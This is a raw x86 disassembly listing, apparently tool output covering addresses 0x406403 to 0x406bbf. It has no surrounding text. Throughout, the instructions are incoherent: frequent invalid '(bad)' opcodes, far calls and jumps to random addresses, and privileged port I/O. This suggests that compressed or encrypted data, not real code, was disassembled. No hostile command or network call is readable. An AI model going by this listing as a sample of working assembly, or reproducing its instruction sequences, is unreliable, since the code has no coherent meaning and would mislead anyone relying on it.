  406403:	xor    DWORD PTR fs:[eax+0x17],ebp
  406407:	push   ds
  406408:	test   eax,0x20864543
  40640d:	repz pop eax
  40640f:	and    esi,DWORD PTR [edx-0x5e238010]
  406415:	push   esp
  406416:	ins    BYTE PTR es:[edi],dx
  406417:	add    al,0x81
  406419:	(bad)  
  40641a:	or     BYTE PTR [eax],ah
  40641c:	sbb    edi,edx
  40641e:	or     edx,DWORD PTR [edi]
  406420:	mov    BYTE PTR [eax],ah
  406422:	shl    dh,1
  406424:	mov    ds:0x1489291b,eax
  406429:	adc    eax,DWORD PTR [ecx+0x123898a2]
  40642f:	adc    BYTE PTR [edi],0xb0
  406432:	cld    
  406433:	xchg   edx,eax
  406434:	push   eax
  406435:	dec    esp
  406436:	call   0xe347f2f6
  40643b:	inc    edi
  40643c:	or     BYTE PTR [ecx-0x7231f59d],cl
  406442:	dec    ebp
  406443:	or     al,0xdb
  406445:	adc    DWORD PTR [ebx],esi
  406447:	dec    edx
  406448:	clc    
  406449:	pop    ebx
  40644a:	mov    WORD PTR [edi-0x448833da],es
  406450:	sub    DWORD PTR [edi*1-0x306e202f],ebp
  406457:	and    eax,edx
  406459:	inc    esi
  40645a:	xor    ch,dh
  40645c:	adc    bl,cl
  40645e:	lods   al,BYTE PTR ds:[esi]
  40645f:	jle    0x4064ac
  406461:	cmp    al,0x2b
  406463:	dec    edi
  406464:	out    0x3c,eax
  406466:	ins    DWORD PTR es:[edi],dx
  406467:	and    al,0xe8
  406469:	ds push ecx
  40646b:	dec    esp
  40646c:	xchg   ecx,eax
  40646d:	pop    esi
  40646e:	dec    eax
  40646f:	rcr    DWORD PTR [eax-0xd],1
  406472:	outs   dx,WORD PTR ds:[esi]
  406474:	pop    es
  406475:	push   0xc3b04c23
  40647a:	ins    DWORD PTR es:[edi],dx
  40647b:	jecxz  0x406469
  40647d:	neg    DWORD PTR [edx-0x6e]
  406480:	ds mov gs:0x5cd79be6,eax
  406487:	jns    0x40645f
  406489:	inc    esp
  40648a:	inc    edx
  40648b:	popa   
  40648c:	daa    
  40648d:	ret    
  40648e:	push   0x1a
  406490:	sub    bl,BYTE PTR [edx]
  406492:	call   0xd27b:0x99532943
  406499:	es ret 
  40649b:	popa   
  40649c:	(bad)  
  40649d:	and    al,BYTE PTR [esi]
  40649f:	jae    0x4064d5
  4064a1:	addr16 dec esi
  4064a3:	loope  0x406486
  4064a5:	in     al,dx
  4064a6:	mov    eax,ds:0xd63df370
  4064ab:	adc    al,0xa8
  4064ad:	std    
  4064ae:	ss call 0xb50:0xeddb
  4064b5:	or     al,0xce
  4064b7:	add    eax,0x6a0faeb
  4064bc:	or     BYTE PTR [edx],0x63
  4064bf:	bound  ebx,QWORD PTR [esp+ebp*2-0x41]
  4064c3:	sub    DWORD PTR [edi+0x310ebdf0],ebp
  4064c9:	ror    DWORD PTR [edx+0x42463e4e],0xd9
  4064d0:	mov    ebp,0x6c0352e9
  4064d5:	test   eax,0xa679aa7c
  4064da:	aas    
  4064db:	daa    
  4064dc:	xlat   BYTE PTR ds:[ebx]
  4064dd:	mov    ah,0xd3
  4064df:	test   eax,0x56f72339
  4064e4:	add    al,0xc
  4064e6:	fcmove st,st(1)
  4064e8:	mov    edx,0x49d79d03
  4064ed:	mov    ebx,0x52d87d16
  4064f2:	inc    edx
  4064f3:	or     BYTE PTR [edi+edi*2-0x70],0x67
  4064f8:	in     al,dx
  4064f9:	sub    DWORD PTR [edx],ebx
  4064fb:	int3   
  4064fc:	pushf  
  4064fd:	fdiv   QWORD PTR [eax+ebp*2+0x3463b83a]
  406504:	or     DWORD PTR [ecx+edi*8+0x7943325d],0xffffffff
  40650c:	mov    cl,bl
  40650e:	and    BYTE PTR [edx-0x3f6f7b43],ch
  406514:	nop
  406515:	retf   
  406516:	jns    0x406525
  406518:	loope  0x406577
  40651a:	ret    0x2786
  40651d:	out    0x5f,eax
  40651f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406520:	loopne 0x406526
  406522:	pop    edi
  406523:	clc    
  406524:	out    dx,eax
  406525:	xchg   esi,eax
  406526:	cwde   
  406527:	push   edx
  406528:	xchg   esp,eax
  406529:	jle    0x40657a
  40652b:	sub    BYTE PTR [ecx],ch
  40652d:	sub    ebp,ebp
  40652f:	inc    ecx
  406530:	leave  
  406531:	in     al,dx
  406532:	and    eax,0x4e3b54d8
  406537:	pop    eax
  406538:	(bad)  [edi+0x4de618fb]
  40653e:	mov    ds:0x80b44e86,eax
  406543:	cmp    eax,0x2b7bd24d
  406548:	pcmpgtb mm2,QWORD PTR [edx-0x555efe0e]
  40654f:	loope  0x40654d
  406551:	sbb    ch,BYTE PTR [ebx+0x61]
  406554:	(bad)  
  406555:	retf   0x478c
  406558:	int3   
  406559:	repnz pop ss
  40655b:	and    edi,DWORD PTR [edi+ecx*8-0x66]
  40655f:	int3   
  406560:	or     bh,BYTE PTR [ebx+0x7e05fd9b]
  406566:	dec    ebp
  406567:	sub    esp,DWORD PTR [edx-0x2e8a2872]
  40656d:	jmp    0x406571
  40656f:	cli    
  406570:	mov    al,0x87
  406572:	nop
  406573:	leave  
  406574:	dec    edx
  406575:	sbb    DWORD PTR [ecx-0x63],0xffffffee
  406579:	add    BYTE PTR [ebp-0x3f],0xb7
  40657d:	leave  
  40657e:	xor    DWORD PTR [esi-0x27],ebx
  406581:	or     dh,BYTE PTR [eax-0x34de5deb]
  406587:	add    cl,al
  406589:	call   0x95d5:0xc6b05e34
  406590:	or     dh,0xfd
  406593:	pop    edi
  406594:	ret    
  406595:	sbb    al,0x17
  406597:	lods   al,BYTE PTR ds:[esi]
  406598:	or     dh,BYTE PTR [eax+0x59be88f4]
  40659e:	jg     0x40661d
  4065a0:	inc    eax
  4065a1:	pop    es
  4065a2:	sbb    BYTE PTR [edi],al
  4065a4:	add    edi,DWORD PTR [eax+0x3c707bdf]
  4065aa:	lahf   
  4065ab:	and    eax,0x3204338a
  4065b0:	repz aaa 
  4065b2:	dec    esp
  4065b3:	pop    edx
  4065b4:	or     al,BYTE PTR [edx-0xd5880ae]
  4065ba:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4065bc:	sahf   
  4065bd:	jo     0x4065df
  4065bf:	lea    ebp,[ecx-0x4a]
  4065c2:	nop
  4065c3:	or     BYTE PTR [edx],dh
  4065c5:	xor    esi,0x67
  4065c8:	jg     0x40655b
  4065ca:	addr16 int 0xae
  4065cd:	(bad)  
  4065ce:	(bad)  
  4065cf:	shl    BYTE PTR [ecx-0x41],cl
  4065d2:	shr    DWORD PTR [ecx-0x70],cl
  4065d5:	hlt    
  4065d6:	imul   ebp,DWORD PTR [edi+0x38],0x18
  4065da:	leave  
  4065db:	inc    eax
  4065dc:	sbb    ebp,eax
  4065de:	clc    
  4065df:	aam    0x3a
  4065e1:	fimul  WORD PTR [ecx+0x7fb499f2]
  4065e7:	scas   al,BYTE PTR es:[edi]
  4065e8:	cmp    BYTE PTR [edx],dh
  4065ea:	and    eax,0xca4ae0f9
  4065f0:	stc    
  4065f1:	dec    esi
  4065f2:	or     cl,BYTE PTR [esi+0xa798cef]
  4065f8:	cmp    eax,0xf3d0d22
  4065fd:	xchg   edi,eax
  4065fe:	jmp    0x7edf:0xf14ae5b3
  406605:	mov    bl,dl
  406607:	jmp    0x3794:0xf9a8e578
  40660e:	cli    
  40660f:	sar    DWORD PTR [ebx-0x68],1
  406612:	fnstcw WORD PTR [edi+ebp*4]
  406615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406616:	push   ebx
  406617:	mov    BYTE PTR [eax],bl
  406619:	mov    esi,0xa78a3603
  40661e:	fild   WORD PTR [edx+0x32]
  406621:	ds loopne 0x4065dc
  406624:	pop    es
  406625:	or     eax,DWORD PTR [eax+0x65e15950]
  40662b:	sbb    al,0x41
  40662d:	aad    0x41
  40662f:	outs   dx,DWORD PTR ds:[esi]
  406630:	jb     0x40661b
  406632:	xchg   BYTE PTR [edx+0x28322acc],cl
  406638:	test   eax,0xdd473398
  40663d:	sahf   
  40663e:	cmc    
  40663f:	push   cs
  406640:	scas   al,BYTE PTR es:[edi]
  406641:	adc    eax,0x81bef659
  406646:	xchg   ebx,eax
  406647:	dec    ecx
  406648:	dec    ecx
  406649:	jbe    0x406636
  40664b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40664c:	nop
  40664d:	aaa    
  40664e:	pop    edx
  40664f:	sub    DWORD PTR [edx+ecx*1],eax
  406652:	(bad)  
  406653:	and    DWORD PTR [edx-0x11],ebp
  406656:	aam    0xb4
  406658:	cs push ebx
  40665a:	loopne 0x40669f
  40665c:	idiv   BYTE PTR [edx]
  40665e:	lahf   
  40665f:	in     al,dx
  406660:	adc    bl,BYTE PTR [ebp-0x2d]
  406663:	fcom   DWORD PTR [edx+0x4f]
  406666:	xor    bl,BYTE PTR [ecx+ecx*2]
  406669:	fld    TBYTE PTR [ebp-0x7467df7f]
  40666f:	hlt    
  406670:	mov    ah,0xee
  406672:	push   esi
  406673:	sbb    BYTE PTR [ebp+ebx*8-0x3c],al
  406677:	and    bh,BYTE PTR [eax+0x5e]
  40667a:	cwde   
  40667b:	dec    esi
  40667c:	stc    
  40667d:	jno    0x406683
  40667f:	fxch   st(6)
  406681:	dec    ebx
  406682:	mov    ebx,0x3529da9d
  406687:	adc    al,0xc1
  406689:	imul   ebp,eax,0x46d5045e
  40668f:	mov    ds:0x64c3385a,eax
  406694:	xor    ecx,DWORD PTR [ebx+esi*4-0x39]
  406698:	xchg   BYTE PTR [ecx-0x10bcafd0],dh
  40669e:	pop    esp
  40669f:	xchg   esp,eax
  4066a0:	dec    ebx
  4066a1:	ds mov dh,0x7
  4066a4:	and    DWORD PTR [ecx],edx
  4066a6:	cmp    eax,0xe433a42b
  4066ab:	das    
  4066ac:	mov    bh,0x2b
  4066ae:	stos   BYTE PTR es:[edi],al
  4066af:	repnz outs dx,DWORD PTR ds:[esi]
  4066b1:	data16 jp 0x4066b6
  4066b4:	pop    ebp
  4066b5:	pop    ss
  4066b6:	ficom  DWORD PTR [esi-0x1fc96d75]
  4066bc:	test   eax,0xd79facfa
  4066c1:	cld    
  4066c2:	fcomp  st(0)
  4066c4:	ds inc edi
  4066c6:	jnp    0x406738
  4066c8:	push   ds
  4066c9:	repnz aaa 
  4066cb:	fisubr WORD PTR [ecx-0x38]
  4066ce:	mov    ch,0x92
  4066d0:	jbe    0x406729
  4066d2:	in     eax,0x4e
  4066d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d5:	stos   BYTE PTR es:[edi],al
  4066d6:	aas    
  4066d7:	test   eax,0x976fefff
  4066dc:	(bad)  
  4066dd:	pushf  
  4066de:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4066e0:	call   0x550da8cd
  4066e5:	daa    
  4066e6:	pop    ebp
  4066e7:	or     esi,DWORD PTR [eax-0x29]
  4066ea:	ins    DWORD PTR es:[edi],dx
  4066eb:	dec    eax
  4066ec:	int    0xdc
  4066ee:	or     dl,dl
  4066f0:	jmp    0x4066a4
  4066f2:	and    eax,0xf6b76721
  4066f7:	in     al,dx
  4066f8:	imul   edx,ebp,0x2ff156b5
  4066fe:	mov    ch,0xe5
  406700:	or     eax,0x9cefe054
  406705:	jo     0x40677c
  406707:	push   eax
  406708:	addr16 sub eax,0x29201115
  40670e:	enter  0x159e,0xb9
  406712:	push   ss
  406713:	mov    cl,0xeb
  406715:	nop
  406716:	push   esi
  406717:	fstp   TBYTE PTR [ebx+0x3f]
  40671a:	(bad)  
  40671b:	hlt    
  40671c:	sahf   
  40671d:	pop    eax
  40671e:	adc    bh,BYTE PTR [esi-0x4299dc40]
  406724:	pop    ebx
  406725:	repnz les ecx,FWORD PTR [ebx+0x7fd0425d]
  40672c:	sub    al,BYTE PTR [edi-0x31]
  40672f:	xor    esi,DWORD PTR [edi-0x24]
  406732:	mov    esp,0x7446d5
  406737:	push   es
  406738:	add    esi,DWORD PTR [eax-0x6a]
  40673b:	pop    DWORD PTR [ebx]
  40673d:	pop    es
  40673e:	repz jns 0x4067a4
  406741:	lds    edx,FWORD PTR [ecx+0x5efca1d1]
  406747:	enter  0xc948,0x51
  40674b:	or     BYTE PTR [ebx+0x396deb39],0x5e
  406752:	ins    BYTE PTR es:[edi],dx
  406753:	scas   eax,DWORD PTR es:[edi]
  406754:	mov    dh,0xcf
  406756:	push   ebp
  406757:	out    0x8a,eax
  406759:	jne    0x4067cd
  40675b:	sbb    dl,BYTE PTR ds:0x33ca4960
  406761:	mov    cl,0xf3
  406763:	sub    al,0xd4
  406765:	stos   DWORD PTR es:[edi],eax
  406766:	ins    BYTE PTR es:[edi],dx
  406767:	test   al,0x24
  406769:	(bad)  
  40676a:	out    dx,al
  40676b:	std    
  40676c:	(bad)  
  40676d:	call   0xbc24:0xc15d3e8c
  406774:	test   DWORD PTR [ecx-0x114b38f6],ecx
  40677a:	(bad)  
  40677b:	sub    DWORD PTR [bx+di-0x6aa4],edi
  406780:	outs   dx,DWORD PTR ds:[esi]
  406781:	mov    al,ds:0xf133f1b3
  406786:	xor    ah,0x57
  406789:	shl    BYTE PTR [esp+ecx*2],1
  40678c:	nop
  40678d:	das    
  40678e:	sbb    BYTE PTR [ecx-0x2112f5dc],0x6a
  406795:	arpl   bp,ax
  406797:	adc    ah,cl
  406799:	js     0x40674d
  40679b:	inc    eax
  40679c:	das    
  40679d:	leave  
  40679e:	add    al,dh
  4067a0:	mov    ebx,0x3c06d58b
  4067a5:	fisttp WORD PTR [ecx]
  4067a7:	pop    ebx
  4067a8:	adc    al,0xd5
  4067aa:	dec    eax
  4067ab:	pop    ebx
  4067ac:	jbe    0x4067d7
  4067ae:	add    ah,al
  4067b0:	add    DWORD PTR [ebx],edx
  4067b2:	fsub   DWORD PTR [eax-0x6e37daa6]
  4067b8:	cld    
  4067b9:	xor    DWORD PTR [ebx],edx
  4067bb:	pop    esi
  4067bc:	xchg   edi,eax
  4067bd:	and    al,0x8d
  4067bf:	call   0xcda5:0xd03ebb35
  4067c6:	outs   dx,BYTE PTR ds:[esi]
  4067c7:	mov    ds:0x42d7ed29,al
  4067cc:	sti    
  4067cd:	sub    BYTE PTR [esi+0x19d3b569],bl
  4067d3:	inc    edi
  4067d4:	addr16 xchg ecx,eax
  4067d6:	mov    edi,DWORD PTR [ecx-0x78372dd]
  4067dc:	cdq    
  4067dd:	pop    esp
  4067de:	lea    ebp,[edx-0x27]
  4067e1:	pop    ecx
  4067e2:	test   al,0x61
  4067e4:	jmp    0xd1d7:0xab2022b6
  4067eb:	test   BYTE PTR [edi+eax*1+0x54],ch
  4067ef:	in     eax,0x77
  4067f1:	in     al,0x61
  4067f3:	and    dh,BYTE PTR [ebx]
  4067f5:	(bad)  
  4067f6:	shl    ecx,1
  4067f8:	fst    DWORD PTR [ecx-0x53]
  4067fb:	push   edx
  4067fc:	scas   eax,DWORD PTR es:[edi]
  4067fd:	stos   DWORD PTR es:[edi],eax
  4067fe:	cmp    cl,BYTE PTR [ebp-0x5632a868]
  406804:	xor    al,0x73
  406806:	shl    bl,0x58
  406809:	xchg   edi,eax
  40680a:	xchg   esp,eax
  40680b:	sahf   
  40680c:	or     DWORD PTR ds:0x695cfc22,esi
  406812:	mov    dl,0x40
  406814:	xor    BYTE PTR [eax],0x2f
  406817:	pop    edx
  406818:	and    eax,0xec71e574
  40681d:	int3   
  40681e:	mov    bl,0xd
  406820:	adc    edi,DWORD PTR [eax+0x5a5d6441]
  406826:	mov    edx,0x31bebdb9
  40682b:	mov    esp,0xa11796d4
  406830:	js     0x4067cf
  406832:	shr    DWORD PTR [esi+0x17],0xe7
  406836:	stos   BYTE PTR es:[edi],al
  406837:	cmp    BYTE PTR [eax],dl
  406839:	(bad)  
  40683a:	cmp    esi,eax
  40683c:	sbb    eax,0x98fa83b9
  406841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406842:	adc    DWORD PTR [esi-0x4f3d5a8e],edx
  406848:	int    0x93
  40684a:	fwait
  40684b:	mov    WORD PTR [esp+ebp*1+0x311c745c],ds
  406852:	pusha  
  406853:	rcr    BYTE PTR [ebp+0x7101adea],1
  406859:	pop    ecx
  40685a:	jnp    0x406882
  40685c:	push   ebx
  40685d:	(bad)  
  40685f:	rcr    BYTE PTR [ecx],0x59
  406862:	xor    ch,cl
  406864:	stos   BYTE PTR es:[edi],al
  406865:	jmp    0x5b48ee80
  40686a:	(bad)  
  40686b:	cli    
  40686c:	lea    eax,[ebx]
  40686e:	xor    ecx,DWORD PTR [ecx]
  406870:	adc    BYTE PTR [eax+ecx*4-0x50c7a17e],ch
  406877:	sbb    DWORD PTR [ebx+esi*1],ebx
  40687a:	mov    ch,bl
  40687c:	in     eax,0x8f
  40687e:	add    eax,0x51e2f7d5
  406883:	and    al,0xf0
  406885:	pop    ebp
  406886:	sub    al,0xdb
  406888:	adc    BYTE PTR [ecx-0x128aecd9],0x27
  40688f:	js     0x40685c
  406891:	frstpm(287 only) 
  406893:	pop    ds
  406894:	stos   DWORD PTR es:[edi],eax
  406895:	in     al,dx
  406896:	imul   esp,DWORD PTR [ebx-0x73c264b1],0x26
  40689d:	mov    bh,0xe0
  40689f:	cmp    DWORD PTR [eax-0x7],0x6d96c782
  4068a6:	add    al,0xf
  4068a8:	cwde   
  4068a9:	jb     0x406850
  4068ab:	int3   
  4068ac:	clc    
  4068ad:	xor    DWORD PTR [edx+ecx*1],0xffffff97
  4068b1:	and    eax,0xba696347
  4068b6:	mov    cl,0x14
  4068b8:	add    eax,0x753f2572
  4068bd:	ins    DWORD PTR es:[edi],dx
  4068be:	dec    edx
  4068bf:	cmp    DWORD PTR [esi+0x47d4b89a],edx
  4068c5:	xchg   ebx,eax
  4068c6:	fnstcw WORD PTR [edi+0x6077fa1]
  4068cc:	jmp    FWORD PTR [ecx]
  4068ce:	sbb    al,0xe
  4068d0:	mov    esi,0x767f6fac
  4068d5:	jecxz  0x40689f
  4068d7:	retf   0x6506
  4068da:	jg     0x4068ea
  4068dc:	push   cs
  4068dd:	cmc    
  4068de:	pop    ds
  4068df:	cwde   
  4068e0:	dec    eax
  4068e1:	ret    
  4068e2:	call   0xb3092927
  4068e7:	mov    ebp,0xd07669a6
  4068ec:	jg     0x406937
  4068ee:	cwde   
  4068ef:	mov    eax,DWORD PTR [ebp+0x5c]
  4068f2:	stc    
  4068f3:	ins    BYTE PTR es:[edi],dx
  4068f4:	or     eax,0x4db701b0
  4068f9:	and    eax,0x73c94107
  4068fe:	adc    al,0xa7
  406900:	call   0x3f483bad
  406905:	jae    0x406909
  406907:	add    DWORD PTR [ebx-0x30d261f2],edx
  40690d:	pop    es
  40690e:	div    DWORD PTR [edi]
  406910:	jno    0x406981
  406912:	popa   
  406913:	arpl   WORD PTR [esi],bp
  406915:	pop    ds
  406916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406917:	mov    bh,0x99
  406919:	data16 (bad) [esi+0x743967b7]
  406920:	mov    cl,0xed
  406922:	hlt    
  406923:	(bad)  
  406925:	xor    dh,BYTE PTR [ecx+0xe]
  406928:	lea    ecx,[edi-0xd6a7d4]
  40692e:	mov    ch,0x19
  406930:	scas   eax,DWORD PTR es:[edi]
  406931:	cwde   
  406932:	test   BYTE PTR [ebx-0x7b7b254a],dl
  406938:	jle    0x40697b
  40693a:	hlt    
  40693b:	mov    dh,0x90
  40693d:	mov    ds:0xaf30a062,al
  406942:	xchg   ecx,eax
  406943:	iret   
  406944:	shr    DWORD PTR [esi-0x15b8cd74],1
  40694a:	out    dx,eax
  40694b:	popa   
  40694c:	pop    edi
  40694d:	enter  0xa875,0xf4
  406951:	or     eax,0x78688810
  406956:	sub    DWORD PTR [ecx-0x3d],0x56
  40695a:	js     0x406969
  40695c:	add    cl,BYTE PTR [edx+0x606d80b3]
  406962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406963:	sbb    al,0xe5
  406965:	in     eax,0xc3
  406967:	lds    edx,FWORD PTR [edi-0x2b]
  40696a:	stc    
  40696b:	xor    eax,0xa52d37a1
  406970:	mov    esi,0x3d327623
  406975:	push   esp
  406976:	ins    DWORD PTR es:[edi],dx
  406977:	test   eax,0xb0f185f4
  40697c:	xchg   DWORD PTR [eax+ecx*1],eax
  40697f:	dec    ebx
  406980:	push   edi
  406981:	and    BYTE PTR [edx-0x4ed4d976],bl
  406987:	cmp    BYTE PTR [edx+esi*8+0x6f562955],0x3c
  40698f:	jo     0x40698e
  406991:	xor    al,al
  406993:	xchg   esp,eax
  406994:	push   ebx
  406995:	sbb    esp,edi
  406997:	stos   BYTE PTR es:[edi],al
  406998:	stos   DWORD PTR es:[edi],eax
  406999:	ds das 
  40699b:	push   es
  40699c:	adc    eax,0xdfdd7035
  4069a1:	add    BYTE PTR [edi+0x1fdf0979],ah
  4069a7:	out    dx,al
  4069a8:	(bad)  
  4069a9:	sbb    dl,BYTE PTR [ecx+0x69]
  4069ac:	out    dx,eax
  4069ad:	fwait
  4069ae:	test   eax,0xd5bfdfb3
  4069b3:	popa   
  4069b4:	push   ss
  4069b5:	in     eax,dx
  4069b6:	(bad)  
  4069b7:	push   edx
  4069b8:	jbe    0x40699a
  4069ba:	es (bad) 
  4069bc:	or     al,0x51
  4069be:	cmp    eax,0xda8c5e53
  4069c3:	cmp    cl,dl
  4069c5:	sar    edi,cl
  4069c7:	or     eax,0xb15a0adc
  4069cc:	(bad)  
  4069cd:	shl    ecx,1
  4069cf:	or     DWORD PTR [ecx],eax
  4069d1:	addr16 push eax
  4069d3:	stos   BYTE PTR es:[edi],al
  4069d4:	jge    0x406a39
  4069d6:	push   ds
  4069d7:	mov    esp,0x7c30ea3f
  4069dc:	ret    
  4069dd:	xor    BYTE PTR [edi+ecx*2],cl
  4069e0:	dec    eax
  4069e1:	aad    0xca
  4069e3:	cmp    BYTE PTR [esi-0x64405dfa],ch
  4069e9:	aam    0x90
  4069eb:	out    dx,eax
  4069ec:	scas   al,BYTE PTR es:[edi]
  4069ed:	jl     0x4069f1
  4069ef:	pop    esp
  4069f0:	cwde   
  4069f1:	lock adc edi,DWORD PTR [ebp+0x142faac0]
  4069f8:	ins    BYTE PTR es:[edi],dx
  4069f9:	mov    DWORD PTR [ebx+0x19],ebp
  4069fc:	adc    ah,dl
  4069fe:	pop    edx
  4069ff:	push   edx
  406a00:	jmp    0x406a32
  406a02:	sar    DWORD PTR [eax+0x9d25a],cl
  406a08:	ins    BYTE PTR es:[edi],dx
  406a09:	imul   edx,DWORD PTR [edi],0x40
  406a0c:	adc    al,0xd9
  406a0e:	adc    bl,BYTE PTR [edx]
  406a10:	ja     0x4069d4
  406a12:	fwait
  406a13:	sub    BYTE PTR [eax+0xcfba19e],cl
  406a19:	test   BYTE PTR [ecx+ebp*2-0x40],al
  406a1d:	mov    al,0xea
  406a1f:	add    al,BYTE PTR [edx+edx*1+0x25]
  406a23:	fild   WORD PTR [edx]
  406a25:	js     0x406a7f
  406a27:	or     ebp,DWORD PTR [ecx+eax*4-0x1e]
  406a2b:	ins    DWORD PTR es:[edi],dx
  406a2c:	mov    ebx,0xd4e096d1
  406a31:	xor    edx,eax
  406a33:	sub    al,0xa8
  406a35:	loope  0x406a29
  406a37:	(bad)  
  406a38:	stos   DWORD PTR es:[edi],eax
  406a39:	dec    ebp
  406a3a:	xchg   ecx,eax
  406a3b:	pop    ds
  406a3c:	test   al,0xda
  406a3e:	push   esp
  406a3f:	ds hlt 
  406a41:	lea    esp,[ebx+0x38]
  406a44:	jl     0x4069da
  406a46:	xchg   ecx,eax
  406a47:	mov    dh,0x58
  406a49:	sbb    BYTE PTR [ecx],dl
  406a4b:	test   al,0xbd
  406a4d:	jmp    0x406aad
  406a4f:	(bad)  
  406a50:	repnz cmp al,0x3e
  406a53:	ret    
  406a54:	fisttp DWORD PTR [ecx]
  406a56:	add    eax,DWORD PTR [eax]
  406a58:	inc    edx
  406a59:	cmp    al,0xe3
  406a5b:	push   ecx
  406a5c:	stos   BYTE PTR es:[edi],al
  406a5d:	int3   
  406a5e:	xor    ebp,DWORD PTR [ebp-0x2c]
  406a61:	je     0x406ac7
  406a63:	or     eax,0x61cf59b5
  406a68:	inc    ecx
  406a69:	xor    DWORD PTR [esi+0x1a],eax
  406a6c:	jb     0x406a90
  406a6e:	inc    edx
  406a6f:	push   es
  406a70:	sub    edi,ebp
  406a72:	mov    DWORD PTR [edx+0x74],edx
  406a75:	test   esi,edi
  406a77:	lods   al,BYTE PTR ds:[esi]
  406a78:	cmp    esp,DWORD PTR [ebx-0x66fdacab]
  406a7e:	mov    dl,0x6a
  406a80:	outs   dx,DWORD PTR ds:[esi]
  406a81:	data16 js 0x406a79
  406a84:	es loop 0x406a96
  406a87:	push   es
  406a88:	push   ds
  406a89:	(bad)  
  406a8a:	mov    edi,DWORD PTR [ecx+0x42bc34dc]
  406a90:	pop    ebx
  406a91:	pop    edx
  406a92:	test   DWORD PTR [ebx+0x9230821],ecx
  406a98:	dec    esp
  406a99:	nop
  406a9a:	fist   WORD PTR [esi]
  406a9c:	jns    0x406acb
  406a9e:	clc    
  406a9f:	outs   dx,BYTE PTR ds:[esi]
  406aa0:	add    al,0x82
  406aa2:	pop    ecx
  406aa3:	pop    edi
  406aa4:	ins    DWORD PTR es:[edi],dx
  406aa5:	push   0xfffffff8
  406aa7:	dec    eax
  406aa8:	push   esp
  406aa9:	jbe    0x406a43
  406aab:	dec    edi
  406aac:	xor    al,BYTE PTR [edi+0x13]
  406aaf:	dec    esi
  406ab0:	dec    edx
  406ab1:	inc    esi
  406ab2:	ins    BYTE PTR es:[edi],dx
  406ab3:	sti    
  406ab4:	push   ebx
  406ab5:	jmp    0xe5cc:0x8554e7b6
  406abc:	jle    0x406aad
  406abe:	inc    esp
  406abf:	imul   DWORD PTR [esi+0x3e]
  406ac2:	xchg   ecx,eax
  406ac3:	test   eax,0x44fc755e
  406ac8:	(bad)  
  406ac9:	pop    eax
  406aca:	iret   
  406acb:	or     DWORD PTR fs:[esi+0x35e34ee8],ebp
  406ad2:	out    0x7d,eax
  406ad4:	xchg   ebp,eax
  406ad5:	add    dh,BYTE PTR [ebx+0x7795542f]
  406adb:	data16 jp 0x406ae0
  406ade:	mov    eax,0x9e38230c
  406ae3:	mov    al,ds:0x2992f693
  406ae8:	aam    0x5a
  406aea:	(bad)  
  406aeb:	adc    eax,0x65735ca1
  406af0:	jmp    DWORD PTR [ebx-0x74]
  406af3:	js     0x406a9c
  406af5:	cs xchg ebx,eax
  406af7:	jae    0x406a94
  406af9:	std    
  406afa:	mov    WORD PTR [eax*2+0x2ced5a47],?
  406b01:	daa    
  406b02:	(bad)  
  406b03:	xchg   edx,eax
  406b04:	std    
  406b05:	mov    eax,ds:0xa88581c8
  406b0a:	mov    dl,0x91
  406b0c:	push   edx
  406b0d:	popa   
  406b0e:	ss daa 
  406b10:	call   0x3584a894
  406b15:	sub    BYTE PTR [ecx],dl
  406b17:	jns    0x406b88
  406b19:	push   ebp
  406b1a:	es mov edx,0x135de0e2
  406b20:	retf   0x3503
  406b23:	xor    ebx,ebx
  406b25:	push   es
  406b26:	cdq    
  406b27:	retf   
  406b28:	addr16 cmp eax,ebp
  406b2b:	push   esi
  406b2c:	pop    esi
  406b2d:	fs xor esp,eax
  406b30:	retf   
  406b31:	inc    esi
  406b32:	popf   
  406b33:	and    ah,BYTE PTR [edx]
  406b35:	fdivr  st,st(2)
  406b37:	scas   al,BYTE PTR es:[edi]
  406b38:	pushf  
  406b39:	je     0x406b62
  406b3b:	push   ebx
  406b3c:	ins    BYTE PTR es:[edi],dx
  406b3d:	(bad)  
  406b3e:	in     al,dx
  406b3f:	mov    eax,DWORD PTR [ebx-0x72b4508c]
  406b45:	scas   eax,DWORD PTR es:[edi]
  406b46:	xchg   edx,eax
  406b47:	dec    edi
  406b48:	push   es
  406b49:	adc    ebx,ebp
  406b4b:	dec    esp
  406b4c:	mov    ds:0xcdc7dd8a,al
  406b51:	push   ecx
  406b52:	push   ss
  406b53:	push   esp
  406b54:	and    dh,BYTE PTR [esi-0x65]
  406b57:	sbb    al,0xc5
  406b59:	xchg   edx,eax
  406b5a:	or     eax,ebx
  406b5c:	mov    ecx,0xd0895422
  406b61:	rcr    DWORD PTR [eax+0x208f7f16],1
  406b67:	jns    0x406b17
  406b69:	push   esp
  406b6a:	icebp  
  406b6b:	and    eax,0x7535299f
  406b70:	enter  0x2fae,0x76
  406b74:	pop    eax
  406b75:	cmc    
  406b76:	add    BYTE PTR [edx+0x4f],cl
  406b79:	pop    edi
  406b7a:	test   BYTE PTR [esp+esi*4-0x7c],dh
  406b7e:	gs push ecx
  406b80:	push   ecx
  406b81:	adc    eax,0x334a0583
  406b86:	sti    
  406b87:	shr    DWORD PTR ds:0xc1a02690,cl
  406b8d:	dec    ebp
  406b8e:	pop    ds
  406b8f:	xchg   DWORD PTR [ebp+0x18f4b123],ebp
  406b95:	jno    0x406bfc
  406b97:	sbb    eax,DWORD PTR [ebp-0x51da9cd6]
  406b9d:	mov    eax,0x4c700a0a
  406ba2:	adc    ebp,DWORD PTR [eax-0x21c59a26]
  406ba8:	dec    eax
  406ba9:	xchg   ebx,eax
  406baa:	and    cl,BYTE PTR [esi-0x31]
  406bad:	icebp  
  406bae:	int    0x3e
  406bb0:	add    BYTE PTR [ebx+0x48],bl
  406bb3:	inc    ecx
  406bb4:	dec    esp
  406bb5:	lods   al,BYTE PTR ds:[esi]
  406bb6:	test   ebp,edx
  406bb8:	in     eax,0x41
  406bba:	fsub   st,st(2)
  406bbc:	das    
  406bbd:	pop    es
  406bbe:	xchg   edi,eax
  406bbf:	push   ebx
